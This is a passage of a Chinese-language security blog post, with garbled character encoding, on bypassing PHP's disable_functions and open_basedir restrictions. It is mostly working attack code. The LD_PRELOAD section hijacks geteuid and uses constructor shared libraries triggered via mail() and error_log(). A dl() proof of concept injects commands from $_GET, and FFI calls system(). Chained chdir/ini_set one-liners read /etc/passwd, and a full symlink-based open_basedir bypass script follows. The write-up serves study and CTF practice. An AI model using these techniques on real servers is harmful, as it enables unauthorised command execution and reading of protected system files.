title="putenvå¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡"></a>putenvå¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure><p>æ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚<br>å¦‚æœè¯¥å‡½æ•°æœªè¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æœ‰å¦‚ä¸‹éªšæ“ä½œï¼š</p><p>1.åˆ¶ä½œä¸€ä¸ªæ¶æ„shared libraries<br>2.ä½¿ç”¨putenvè®¾ç½®LD_PRELOADä¸ºæ¶æ„æ–‡ä»¶è·¯å¾„<br>3.ä½¿ç”¨æŸä¸ªphpå‡½æ•°ï¼Œè§¦å‘specific shared library<br>4.æˆåŠŸè¿›è¡ŒRCE<br><img src="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/2019-03-25-15-17-11.png" alt="img"></p><p>å¯¹LD_PRELOADçš„åˆ©ç”¨å¤§æ¦‚å¯åˆ†ä¸ºä¸¤ç§ï¼Œç¬¬ä¸€ç§æ˜¯åŠ«æŒåº“å‡½æ•°ï¼Œç¬¬äºŒç§æ˜¯åŠ«æŒå¯åŠ¨è¿›ç¨‹</p><ul><li>åŠ«æŒåº“å‡½æ•°</li></ul><p>ç½‘ä¸Šå¤§å¤šæ•°éƒ½æ˜¯åŠ«æŒçš„getuidï¼Œå…¶å®èƒ½åŠ«æŒçš„å¹¶ä¸åªgetuid,æˆ‘ä»¬éœ€è¦åŠ«æŒçš„å‡½æ•°éœ€è¦æ»¡è¶³ï¼Œæ­¤å‡½æ•°ä¸ºç‚¹ï¼š<strong>ç»å¸¸è¢«ç”¨åˆ°çš„å¹¶ä¸”ä¸ºæ— å‚æ•°çš„å‡½æ•°</strong></p><p>æ¯”å¦‚getuid,getpid,getgid,getppidè¿™ç§ï¼Œå…·ä½“çš„å¯ä»¥fuzzä¸€ä¸‹ï¼Œåº”è¯¥è›®å¤šçš„</p><p>å…·ä½“æ“ä½œè¿‡ç¨‹(ä»¥geteuidçš„åŠ«æŒä¸ºä¾‹)</p><p>hack.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">        system(&quot;whoami &gt; hack&quot;);</span><br><span class="line">&#125;   </span><br><span class="line">int  geteuid() &#123;</span><br><span class="line">if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆsoæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure><p>å†™ä¸€ä¸ªhack.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);&#x2F;&#x2F;error_log(&#39;&#39;,1); </span><br><span class="line">&#x2F;&#x2F;imap_mail(&#39;a@a&#39;,1,1,1,1);</span><br><span class="line">&#x2F;&#x2F;$img &#x3D; new Imagick(&#39;test.wmv&#39;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;mail()å‡½æ•°æ‰§è¡Œé»˜è®¤æ˜¯ä¼šè°ƒç”¨å¤–éƒ¨ç¨‹åºsendmailçš„</span><br></pre></td></tr></table></figure><p>è€Œæ—¢ç„¶è¦åœ¨phpè¿è¡Œæ—¶è¢«è§¦å‘ï¼Œé‚£ä¹ˆåŠ¿å¿…é€‰æ‹©ä¸€ä¸ªéå¸¸å¸¸ç”¨çš„å‡½æ•°æ‰è¡Œã€‚è¿™é‡Œèƒ½è°ƒç”¨çš„å‡½æ•°ä¸æ­¢æœ‰mailï¼Œåœ¨mailå‡½æ•°è¢«banæ‰çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ç”¨error_logï¼Œimap_mailç­‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯error_logçš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦è®¾ç½®ä¸º1è¡¨ç¤ºå‘é€é‚®ä»¶ä¼šè°ƒç”¨sendmailè¿›ç¨‹ï¼Œimap_mailä¹Ÿå¯è°ƒç”¨sendmailè¿›ç¨‹ï¼Œå³å¯è°ƒç”¨sendmailå­è¿›ç¨‹ï¼ŒåŒæ ·åˆ©ç”¨Imagickå‡½æ•°è§¦å‘è°ƒç”¨äº†æ–°è¿›ç¨‹ffmpegè¿›è¡Œå¤„ç†å›¾åƒ</p><p>imap_mail()é€‚ç”¨äº<code>PHP &lt; 5.6.2</code>çš„</p><p>ä½¿ç”¨Imagickå‡½æ•°çš„æ—¶å€™ï¼ŒMPEG formatæ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ— æ³•è°ƒç”¨<code>ffmpeg</code></p><ul><li>åŠ«æŒå¯åŠ¨è¿›ç¨‹</li></ul><p>ä»ä¸Šé¢æ¥çœ‹ï¼ŒåŠ«æŒåº“å‡½æ•°éœ€è¦æ‰¾åˆ°ç‰¹å®šçš„åº“å‡½æ•°å»åŠ«æŒï¼Œé‚£ä¹ˆåŠ«æŒæ–°è¿›ç¨‹æ˜¯ä¸éœ€è¦æ‰¾åˆ°ç‰¹å®šçš„åº“å‡½æ•°çš„ã€‚</p><blockquote><p>GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <code>__attribute__((constructor))</code>ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <code>__attribute__((constructor))</code> ä¿®é¥°çš„å‡½æ•°ã€‚</p></blockquote><p><strong>attribute</strong>((constructor))æ›´åŠ ç›´æ¥çš„å»è®²ï¼šæœ‰è¿™ä¸ªè¯´æ˜ï¼š</p><p><strong>å®ƒæ˜¯åœ¨åŠ è½½å…±äº«åº“æ—¶è¿è¡Œçš„ï¼Œé€šå¸¸æ˜¯åœ¨ç¨‹åºå¯åŠ¨è¿‡ç¨‹ä¸­</strong>ï¼Œä¹Ÿå°±æ˜¯å½“æœ‰ä¸€ä¸ªæ–°è¿›ç¨‹/å­è¿›ç¨‹å¯åŠ¨æ—¶ï¼Œé‚£ä¹ˆ<strong>attribute</strong>((constructor))å°±ä¼šè¢«ç›´æ¥åŠ è½½ï¼Œæˆ‘ä»¬ä¸Šé¢çš„mailç­‰å‡½æ•°ä¹Ÿæ­£å¥½ç¬¦åˆè¿™ä¸ªç‰¹æ€§ï¼Œä¸‹é¢ä¹Ÿæ¥ç€æ¥è¯•ä¸€ä¸‹:</p><p>hack.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hack.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">error_log(&#39;&#39;,1);</span><br></pre></td></tr></table></figure><h3 id="0x-05-å…¶ä»–bypassæŠ€å·§ä»‹ç»"><a href="#0x-05-å…¶ä»–bypassæŠ€å·§ä»‹ç»" class="headerlink" title="0x 05 å…¶ä»–bypassæŠ€å·§ä»‹ç»"></a>0x 05 å…¶ä»–bypassæŠ€å·§ä»‹ç»</h3><h4 id="å¤–éƒ¨æ‰©å±•åº“dl-bypassä»‹ç»"><a href="#å¤–éƒ¨æ‰©å±•åº“dl-bypassä»‹ç»" class="headerlink" title="å¤–éƒ¨æ‰©å±•åº“dl bypassä»‹ç»"></a>å¤–éƒ¨æ‰©å±•åº“dl bypassä»‹ç»</h4><blockquote><p>å®ç°æ–¹æ³•å‚è€ƒï¼š<a href="https://cloud.tencent.com/developer/article/1141142" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1141142</a></p></blockquote><blockquote><table><thead><tr><th>ç‰ˆæœ¬</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>7.0.0</td><td>PHP-FPM æ¨¡å¼ä¸‹å·²ç¦ç”¨ <strong>dl()</strong>ã€‚</td></tr><tr><td>5.3.9</td><td>å°½ç®¡ä¸æ¨èï¼Œä½† PHP-FPM æ¨¡å¼ä¸‹å¯ç”¨äº† <strong>dl()</strong>ã€‚</td></tr><tr><td>5.3.0</td><td>ç”±äºç¨³å®šæ€§ï¼Œ<strong>dl()</strong> åœ¨æŸäº› SAPI ä¸­è¢«ç¦ç”¨ã€‚ä»…ä»…å…è®¸ <strong>dl()</strong> çš„ SAPI ä¸º CLI å’Œ Embedã€‚ ä½¿ç”¨ <a href="https://www.php.net/manual/zh/ini.core.php#ini.extension" target="_blank" rel="noopener">æ‰©å±•åŠ è½½æŒ‡ä»¤</a> ä½œä¸ºæ›¿ä»£ã€‚</td></tr></tbody></table></blockquote><blockquote><p>SAPIï¼ˆServer Application Programming Interfaceï¼‰æœåŠ¡å™¨åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå³PHPä¸å…¶ä»–åº”ç”¨äº¤äº’çš„æ¥å£ï¼ŒPHPè„šæœ¬è¦æ‰§è¡Œæœ‰å¾ˆå¤šæ–¹å¼ï¼Œé€šè¿‡WebæœåŠ¡å™¨ï¼Œæˆ–è€…ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸‹ï¼Œä¹Ÿå¯ä»¥åµŒå…¥åœ¨å…¶ä»–ç¨‹åºä¸­ã€‚</p><p>SAPIæä¾›äº†ä¸€ä¸ªå’Œå¤–éƒ¨é€šä¿¡çš„æ¥å£ï¼Œå¸¸è§çš„SAPIæœ‰ï¼šcgiã€fast-cgiã€cliã€apacheæ¨¡å—çš„DLLã€isapi</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server API FPM&#x2F;FastCGI</span><br></pre></td></tr></table></figure><p>æ¡ä»¶ï¼šphp.iniä¸­éœ€è®¾ç½®enable_dl=true</p><p>dl bypass-poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpdl(&quot;dl.so&quot;);  &#x2F;&#x2F;dl.soåœ¨extension_dirç›®å½•ï¼Œå¦‚ä¸åœ¨åˆ™ç”¨..&#x2F;..&#x2F;æ¥å®ç°è°ƒç”¨confirm_dl_compiled(&quot;$_GET[a]&gt;;1.txt&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯dl.soè¿™ä¸ªæ–‡ä»¶çš„æœç´¢ï¼Œé€šè¿‡è°ƒç”¨dl.soè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><h4 id="PHP7-4-FFI-bypassä»‹ç»"><a href="#PHP7-4-FFI-bypassä»‹ç»" class="headerlink" title="PHP7.4-FFI bypassä»‹ç»"></a>PHP7.4-FFI bypassä»‹ç»</h4><p>åœ¨RCTF2019ä¸­å‡ºçš„é¢˜ï¼Œè€ƒå¯Ÿäº†php7.4çš„æ–°ç‰¹æ€§ï¼Œé€šè¿‡æ–°åŠ çš„FFIå³å¯bypass disable function</p><p>å‚è€ƒRCTF2019RCTF 2019 nextphp <a href="https://xz.aliyun.com/t/5218" target="_blank" rel="noopener">https://xz.aliyun.com/t/5218</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"></span><br><span class="line">$ffi-&gt;system(<span class="string">"id"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœåªå®šä¹‰ system å‡½æ•°è€Œçœç•¥ libc.so.6 åŒæ ·ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ”¯æŒ RTLD_DEFAULT çš„å¹³å°å°†å°è¯•åœ¨å¸¸è§„å…¨å±€èŒƒå›´å†…æŸ¥æ‰¾åœ¨ä»£ç ä¸­å£°æ˜çš„ç¬¦å·</p><p> å½“æˆ‘ä»¬åªèƒ½æ§åˆ¶ FFI::cdef å‡½æ•°çš„ lib å‚æ•°çš„æ—¶å€™ï¼ŒFFI::cdef å‡½æ•°è¿˜å¯ä»¥åŠ è½½æˆ‘ä»¬è‡ªå®šä¹‰çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä½†æ˜¯éœ€è¦å¡«å†™ç»å¯¹è·¯å¾„ï¼Œå¦åˆ™ä¼šæ— æ³•åŠ è½½ï¼Œæ¯”å¦‚</p><p>ffi.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">        <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">        <span class="string">"/var/www/html/bad.so"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>bad.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">j0k3r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"echo Hacked &amp;&amp; id"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦åŠ è½½ç¼–è¯‘å¥½çš„ bad.so å³å¯æ‰§è¡Œæ¶æ„ä»£ç </p><h3 id="0x-06-å¸¸ç”¨çš„bypassé“¾æ¥"><a href="#0x-06-å¸¸ç”¨çš„bypassé“¾æ¥" class="headerlink" title="0x 06 å¸¸ç”¨çš„bypassé“¾æ¥"></a>0x 06 å¸¸ç”¨çš„bypassé“¾æ¥</h3><blockquote><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">some exploits in php7</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass disable_functions via LD_PRELOAD</a> åˆ©ç”¨åŠ«æŒå¯åŠ¨è¿›ç¨‹+mail()å‡½æ•°å®ç°</p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p></blockquote><h3 id="0x-07-Bypass-open-basedir"><a href="#0x-07-Bypass-open-basedir" class="headerlink" title="0x 07 Bypass open_basedir"></a>0x 07 Bypass open_basedir</h3><h4 id="chdir-bypass"><a href="#chdir-bypass" class="headerlink" title="chdir bypass"></a>chdir bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¯»é…ç½®æ–‡ä»¶cmd&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file_get_contents(&quot;&#x2F;etc&#x2F;passwd&quot;));</span><br><span class="line">åˆ—ç›®å½•cmd&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">è¯»æ–‡ä»¶md&#x3D;mkdir(&quot;&#x2F;tmp&#x2F;fuck&quot;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#x2F;&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);readfile(&quot;&#x2F;THis_Is_tHe_F14g&quot;));</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨symlink-å‡½æ•°æ¥Bypass"><a href="#åˆ©ç”¨symlink-å‡½æ•°æ¥Bypass" class="headerlink" title="åˆ©ç”¨symlink()å‡½æ•°æ¥Bypass"></a>åˆ©ç”¨symlink()å‡½æ•°æ¥Bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line">* by phithon</span><br><span class="line">* From https:&#x2F;&#x2F;www.leavesongs.com</span><br><span class="line">* detail: http:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2009110068</span><br><span class="line">*&#x2F;</span><br><span class="line">header(&#39;content-type: text&#x2F;plain&#39;);</span><br><span class="line">error_reporting(-1);</span><br><span class="line">ini_set(&#39;display_errors&#39;, TRUE);</span><br><span class="line">printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#39;open_basedir&#39;), phpversion());</span><br><span class="line">printf(&quot;disable_functions: %s\n&quot;, ini_get(&#39;disable_functions&#39;));</span><br><span class="line">$file &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, isset($_REQUEST[&#39;file&#39;]) ? $_REQUEST[&#39;file&#39;] : &#39;&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">$relat_file &#x3D; getRelativePath(__FILE__, $file);</span><br><span class="line">$paths &#x3D; explode(&#39;&#x2F;&#39;, $file);</span><br><span class="line">$name &#x3D; mt_rand() % 999;</span><br><span class="line">$exp &#x3D; getRandStr();</span><br><span class="line">mkdir($name);</span><br><span class="line">chdir($name);</span><br><span class="line">for($i &#x3D; 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;</span><br><span class="line">    mkdir($paths[$i]);</span><br><span class="line">    chdir($paths[$i]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir($paths[$i]);</span><br><span class="line">for ($i -&#x3D; 1; $i &gt; 0; $i--) &#123; </span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$paths &#x3D; explode(&#39;&#x2F;&#39;, $relat_file);</span><br><span class="line">$j &#x3D; 0;</span><br><span class="line">for ($i &#x3D; 0; $paths[$i] &#x3D;&#x3D; &#39;..&#39;; $i++) &#123; </span><br><span class="line">    mkdir($name);</span><br><span class="line">    chdir($name);</span><br><span class="line">    $j++;</span><br><span class="line">&#125;</span><br><span class="line">for ($i &#x3D; 0; $i &lt;&#x3D; $j; $i++) &#123; </span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$tmp &#x3D; array_fill(0, $j + 1, $name);</span><br><span class="line">symlink(implode(&#39;&#x2F;&#39;, $tmp), &#39;tmplink&#39;);</span><br><span class="line">$tmp &#x3D; array_fill(0, $j, &#39;..&#39;);</span><br><span class="line">symlink(&#39;tmplink&#x2F;&#39; . implode(&#39;&#x2F;&#39;, $tmp) . $file, $exp);</span><br><span class="line">unlink(&#39;tmplink&#39;);</span><br><span class="line">mkdir(&#39;tmplink&#39;);</span><br><span class="line">delfile($name);</span><br><span class="line">$exp &#x3D; dirname($_SERVER[&#39;SCRIPT_NAME&#39;]) . &quot;&#x2F;&#123;$exp&#125;&quot;;</span><br><span class="line">$exp &#x3D; &quot;http:&#x2F;&#x2F;&#123;$_SERVER[&#39;SERVER_NAME&#39;]&#125;&#123;$exp&#125;&quot;;</span><br><span class="line">echo &quot;\n-----------------content---------------\n\n&quot;;</span><br><span class="line">echo file_get_contents($exp);</span><br><span class="line">delfile(&#39;tmplink&#39;);</span><br><span class="line"></span><br><span class="line">function getRelativePath($from, $to) &#123;</span><br><span class="line">  &#x2F;&#x2F; some compatibility fixes for Windows paths</span><br><span class="line">  $from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;</span><br><span class="line">  $from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);</span><br><span class="line">  $to   &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);</span><br><span class="line"></span><br><span class="line">  $from   &#x3D; explode(&#39;&#x2F;&#39;, $from);</span><br><span class="line">  $to     &#x3D; explode(&#39;&#x2F;&#39;, $to);</span><br><span class="line">  $relPath  &#x3D; $to;</span><br><span class="line"></span><br><span class="line">  foreach($from as $depth &#x3D;&gt; $dir) &#123;</span><br><span class="line">    &#x2F;&#x2F; find first non-matching dir</span><br><span class="line">    if($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;</span><br><span class="line">      &#x2F;&#x2F; ignore this directory</span><br><span class="line">      array_shift($relPath);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      &#x2F;&#x2F; get number of remaining dirs to $from</span><br><span class="line">      $remaining &#x3D; count($from) - $depth;</span><br><span class="line">      if($remaining &gt; 1) &#123;</span><br><span class="line">        &#x2F;&#x2F; add traversals up to first matching dir</span><br><span class="line">        $padLength &#x3D; (count($relPath) + $remaining - 1) * -1;</span><br><span class="line">        $relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);</span><br><span class="line">        break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        $relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return implode(&#39;&#x2F;&#39;, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function delfile($deldir)&#123;</span><br><span class="line">    if (@is_file($deldir)) &#123;</span><br><span class="line">        @chmod($deldir,0777);</span><br><span class="line">        return @unlink($deldir);</span><br><span class="line">    &#125;else if(@is_dir($deldir))&#123;</span><br><span class="line">        if(($mydir &#x3D; @opendir($deldir)) &#x3D;&#x3D; NULL) return false;</span><br><span class="line">        while(false !&#x3D;&#x3D; ($file &#x3D; @readdir($mydir)))</span><br><span class="line">        &#123;</span><br><span class="line">            $name &#x3D; File_Str($deldir.&#39;&#x2F;&#39;.$file);</span><br><span class="line">            if(($file!&#x3D;&#39;.&#39;) &amp;&amp; ($file!&#x3D;&#39;..&#39;))&#123;delfile($name);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir($mydir);</span><br><span class="line">        @chmod($deldir,0777);</span><br><span class="line">        return @rmdir($deldir) ? true : false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function File_Str($string)</span><br><span class="line">&#123;</span><br><span class="line">    return str_replace(&#39;&#x2F;&#x2F;&#39;,&#39;&#x2F;&#39;,str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$string));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getRandStr($length &#x3D; 6) &#123;</span><br><span class="line">    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $randStr &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randStr .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $randStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/11.png" alt></p><p>æ›´å¤šbypassæ–¹æ³•å‚è€ƒï¼š<a href="https://www.mi1k7ea.com/2019/07/20/æµ…è°ˆå‡ ç§Bypass-open-basedirçš„æ–¹æ³•/#ç½‘ä¸Šçš„ä¸€ä¸ªè„šæœ¬" target="_blank" 